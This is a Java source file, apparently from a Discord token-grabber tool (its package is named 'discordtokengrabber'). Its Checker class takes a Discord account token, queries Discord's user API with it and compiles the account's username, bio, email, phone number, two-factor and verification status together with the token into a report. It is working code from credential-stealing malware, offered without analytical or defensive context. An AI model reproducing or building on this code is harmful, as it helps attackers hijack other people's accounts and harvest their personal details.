package com.github.dedinc.discordtokengrabber.utils;

import org.json.JSONObject;

public class Checker {

    public String checkUser(String token) {
        JSONObject response = new JSONObject(Helper.getRequest().get("https://discordapp.com/api/v9/users/@me", token));
        String info = "===User Info===\n\n\n";
        String username = String.format("%s#%s", response.getString("username"), response.getString("discriminator"));
        String bio = response.getString("bio");
        String email = response.getString("email");
        Boolean twofa = response.getBoolean("mfa_enabled");
        Boolean verified = response.getBoolean("verified");
        info += "Username: " + username;
        info += "\nBio: " + bio;
        info += "\nEmail: " + email;
        try {
            info += "\nPhone: " + response.getString("phone");
        } catch (Exception e) {}
        return String.format(info + "\n2FA: %b\nVerified: %b\n\nToken: %s", twofa, verified, token);
    }
}
